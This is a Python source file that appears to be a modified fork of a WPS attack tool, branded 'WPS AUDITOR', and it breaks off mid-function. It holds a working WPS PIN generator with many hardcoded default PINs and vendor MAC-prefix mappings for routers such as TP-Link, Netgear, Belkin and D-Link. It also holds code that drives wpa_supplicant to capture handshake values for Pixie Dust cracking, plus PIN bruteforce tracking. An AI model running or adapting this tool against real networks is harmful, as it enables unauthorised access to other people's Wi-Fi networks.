#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Modify History : rofl0r => FARHAN => Mohammad_Alamin (Toxinum) (FARHAN)
# VERSION 1.0.1
# Open Source Code.No Need More Modification.
import sys, subprocess, os, tempfile, shutil, re, codecs, socket, pathlib, time, collections, statistics, csv, http.client, marshal, select, threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from time import sleep 
from datetime import datetime
from typing import Dict

class Colors:
    GREEN = '\033[32m'
    RED = '\033[31m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

WEB_LOGS = collections.deque(maxlen=100)

def add_web_log(msg):
    clean_msg = re.sub(r'\033\[[0-9;]*m', '', msg)
    WEB_LOGS.append(f"[{datetime.now().strftime('%H:%M:%S')}] {clean_msg}")

def info(msg):
    print(f"{Colors.DIM}•{Colors.RESET} {msg}")
    add_web_log(f"• {msg}")

def success(msg):
    print(f"{Colors.GREEN}✓{Colors.RESET} {msg}")
    add_web_log(f"✓ {msg}")

def error(msg):
    print(f"{Colors.RED}✗{Colors.RESET} {msg}")
    add_web_log(f"✗ {msg}")

def warning(msg):
    print(f"{Colors.YELLOW}!{Colors.RESET} {msg}")
    add_web_log(f"! {msg}")

def ani(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.005)

def show_banner():
    print(f"\n{Colors.BOLD}WPS AUDITOR{Colors.RESET} {Colors.DIM}v1.0.2{Colors.RESET}")
    print(f"{Colors.DIM}──────────────────────────────────────────{Colors.RESET}")

now = datetime.now()
now_time = str(now.strftime("%d:%m:%Y - %H:%M:%S"))

class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('[\033[1;31m!\033[1;37m] MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other

    def __isub__(self, other):
        self.integer -= other

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)

class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = { 'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
    'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
    'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
    'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
    'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
    'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
    'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
    # Algoritmos de PIN estáticos
    'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
    'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
    'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
    'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
    'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
    'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
    'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
    'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
    'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
    'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
    'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
    'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
    'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
    'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
    'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
    'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
    'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
    'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
    'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
    'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
    'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
    'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
    'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521},
    # Nuevas entradas
    'pinNetgear1': {'name': 'Netgear 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4823748},
    'pinNetgear2': {'name': 'Netgear 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7583940},
    'pinLinksys1': {'name': 'Linksys 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2938475},
    'pinLinksys2': {'name': 'Linksys 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6473820},
    'pinTPWR741N': {'name': 'TP-WR741N', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 66870913},
    'pinTPWR841N': {'name': 'TP-WR841N', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 85075542},
    'pinTPWR842ND': {'name': 'TP-WR842ND', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 55117319},
    'pinTDW8960N1': {'name': 'TD-W8960N 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37211202},
    'pinTDW8960N2': {'name': 'TD-W8960N 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 95817149},
    'pinTDW8960N3': {'name': 'TD-W8960N 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 41441282},
    'pinTDW8960N4': {'name': 'TD-W8960N 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 20917784},
    'pinTDW8961ND1': {'name': 'TD-W8961ND 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 56738209},
    'pinTDW8961ND2': {'name': 'TD-W8961ND 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 40176451},
    'pinTDW8961ND3': {'name': 'TD-W8961ND 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37493691},
    'pinTDW8961ND4': {'name': 'TD-W8961ND 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 57739601},
    'pinTDW8961ND5': {'name': 'TD-W8961ND 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 40184708},
    'pinTDW8961ND6': {'name': 'TD-W8961ND 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 40166148},
    'pinTDW8961ND7': {'name': 'TD-W8961ND 7', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 93834186},
    'pinTDW8961ND8': {'name': 'TD-W8961ND 8', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 93802598},
    'pinTDW8961ND9': {'name': 'TD-W8961ND 9', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37505073},
    'pinTDW8961ND10': {'name': 'TD-W8961ND 10', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 61116597},
    'pinTDW8961ND11': {'name': 'TD-W8961ND 11', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37494506},
    'pinTDW8961ND12': {'name': 'TD-W8961ND 12', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37494063},
    'pinTDW8961ND13': {'name': 'TD-W8961ND 13', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37489014},
    'pinTDW8961ND14': {'name': 'TD-W8961ND 14', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37496081},
    'pinTDW896N1D': {'name': 'TD-W896N1D', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37494650},
    'pinTDW8961ND15': {'name': 'TD-W8961ND 15', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37490034},
    # Netgear
    'pinDGN1000_1': {'name': 'Netgear DGN1000 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 19004938},
    'pinDGN1000_2': {'name': 'Netgear DGN1000 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 82234577},
    'pinDGN1000_3': {'name': 'Netgear DGN1000 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 30022645},
    'pinDGN1000_4': {'name': 'Netgear DGN1000 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 32312966},
    'pinDGN1000_5': {'name': 'Netgear DGN1000 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 27334959},
    'pinWNR2000_1': {'name': 'Netgear WNR2000 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 50292127},
    'pinWNR2000_2': {'name': 'Netgear WNR2000 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37380342},
    'pinDGN2000': {'name': 'Netgear DGN2000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 38686191},
    'pinDG834GU': {'name': 'Netgear DG834GU', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 64426679},
    # Belkin
    'pinF9J1102_1': {'name': 'Belkin F9J1102 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 19366838},
    'pinF9J1102_2': {'name': 'Belkin F9J1102 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 87279320},
    'pinF9J1102_3': {'name': 'Belkin F9J1102 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 83469909},
    'pinF9J1102_4': {'name': 'Belkin F9J1102 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 14159114},
    'pinF7D4401_1': {'name': 'Belkin F7D4401 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 15310828},
    'pinF7D4401_2': {'name': 'Belkin F7D4401 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 36323364},
    'pinF7D4401_3': {'name': 'Belkin F7D4401 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 17579957},
    'pinF7D4401_4': {'name': 'Belkin F7D4401 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 8112118},
    'pinF5D8635_1': {'name': 'Belkin F5D8635 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 12885381},
    'pinF5D8635_2': {'name': 'Belkin F5D8635 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 29874590},
    'pinF7D3402': {'name': 'Belkin F7D3402', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 8318725},
    # DLink
    'pinDIR655': {'name': 'DLink DIR-655', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 95061771},
    'pinDSL2740B_1': {'name': 'DLink DSL-2740B 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 44686871},
    'pinDSL2740B_2': {'name': 'DLink DSL-2740B 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 59185239}}

    @staticmethod
    def checksum(pin):
        """
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        """
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        """
        WPS pin generator
        @algo — the WPS pin algorithm ID
        Returns the WPS pin string value
        """
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC as list
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            res.append(self.generate(ID, mac))
        return res

    def getSuggested(self, mac):
        """
        Get all suggested WPS pin's for single MAC
        """
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        """
        Get all suggested WPS pin's for single MAC as list
        """
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    def _suggest(self, mac):
        """
        Get algos suggestions for single MAC
        Returns the algo ID
        """
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C'),
            # Nuevas sugerencias
            'pinTPWR741N': ('E894F6', 'F8D111', '346BD3'),
            'pinTPWR841N': ('E894F6', 'F8D111', '346BD3', '90F652'),
            'pinTPWR842ND': ('E894F6', 'F8D111', '346BD3'),
            'pinTDW8960N1': ('74EA3A', '90F652', 'F8D111'),
            'pinTDW8961ND1': ('90F652', 'B0487A', 'F8D111'),
            'pinDGN1000_1': ('E0469A', 'E091F5', '30469A', '0026F2'),
            'pinF9J1102_1': ('EC1A59', '08863B'),
            'pinF7D4401_1': ('944452', '08863B'),
            'pinF5D8635_1': ('002275', '944452'),
            'pinDIR655': ('002401', '00265A', '14D64D')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pinDLink(self, mac):
        # Get the NIC part
        nic = mac.integer & 0xFFFFFF
        # Calculating pin
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin


def recvuntil(pipe, what):
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
                    self.pke, self.pkr, self.e_hash1,
                    self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()   # Last PIN attempt start time
        self.attempts_times = collections.deque(maxlen=15)

        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        info('{:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.start_time, average_pin_time))

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


class Companion:
    """Main application part"""
    def __init__(self, interface, save_result=False, print_debug=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        if user_home == '/':
            user_home = os.path.dirname(os.path.realpath(__file__))
        self.sessions_dir = f'{user_home}/.WiFi/sessions/'
        self.pixiewps_dir = f'{user_home}/.WiFi/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)

        self.generator = WPSpin()

    def __init_wpa_supplicant(self):
        print('[\033[1;33m*\033[1;37m] Ejecutando wpa_supplicant…')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        # Waiting for wpa_supplicant control interface initialization
        while not os.path.exists(self.wpas_ctrl_path):
            pass

    def sendOnly(self, command):
        """Sends command to wpa_supplicant"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        """Sends command to wpa_supplicant and returns the reply"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    def __handle_wpas(self, pixiemode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                info(f'Receiving WPS Message M{n}...')
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                info(f'Received WPS Message M{n}')
                if n == 5:
                    success('M5 received - PIN half potentially valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                info('Received WSC NACK')
                error('Error: Wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert(len(self.pixie_creds.e_nonce) == 16*2)
                if pixiemode:
                    print(f'{Colors.CYAN}[P]{Colors.WHITE} E-Nonce: {self.pixie_creds.e_nonce}')
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                assert(len(self.pixie_creds.pkr) == 192*2)
                if pixiemode:
                    print(f'{Colors.CYAN}[P]{Colors.WHITE} PKR: {self.pixie_creds.pkr}')
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                assert(len(self.pixie_creds.pke) == 192*2)
                if pixiemode:
